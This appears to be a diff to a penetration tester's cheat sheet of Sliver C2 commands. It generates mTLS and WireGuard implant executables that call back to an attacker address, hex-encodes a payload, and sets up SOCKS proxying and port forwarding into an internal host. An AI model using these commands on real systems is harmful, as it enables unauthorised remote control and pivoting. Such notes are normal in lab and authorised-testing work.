@@ -5,6 +5,7 @@ profiles new --mtls 10.10.14.60:443 --skip-symbols --format exe --arch amd64 --o
 
 # generate wireguard implant
 generate --wg <tun0> --format exe
+wg
 xxd -p <FILE> | sed 's/\(..\)/\\x\1/g' | tr -d '\n'
 
 # interact/use beacon
@@ -44,5 +45,9 @@ wg-socks start
 sudo vim /etc/proxychains.conf
 ...
 socks5 SLIVER_SOCKS_SERVER_IP 3090
+
+# port forward
+portfwd add --remote 172.16.1.13:80
+[*] Port forwarding 127.0.0.1:8080 -> 172.16.1.13:80
 
 $ LHOST: ip -f inet addr show tun0 | sed -En -e 's/.*inet ([0-9.]+).*/\1/p'
